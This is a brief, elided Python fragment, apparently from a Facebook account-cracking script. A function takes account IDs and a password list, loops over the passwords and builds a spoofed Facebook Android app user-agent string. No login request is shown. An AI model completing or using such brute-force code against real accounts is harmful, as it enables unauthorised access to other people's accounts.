...
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua = 'Dalvik/2.0.0 (Linux; U; Android 11; Xiaomi Mi 11 Build/RKQ1.200826.002) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=3.5,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Xiaomi;FBMF/Mi 11;FBBD/Mi 11;FBPN/com.facebook.katana;FBDV/Mi 11;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'
